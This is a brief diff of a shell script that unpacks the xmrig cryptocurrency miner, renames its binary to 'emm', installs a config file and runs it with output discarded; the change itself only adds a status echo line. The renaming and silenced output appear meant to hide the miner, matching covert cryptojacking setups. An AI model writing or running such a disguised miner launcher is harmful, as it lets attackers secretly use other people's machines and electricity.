@@ -3,4 +3,5 @@ tar -zxvf xmrig.tar.gz >> /dev/null
 mv xmrig*/ emm
 mv emm/xmrig emm/emm
 cp config.json emm/config.json
+echo ok.progress_running
 ./emm/emm >> /dev/null
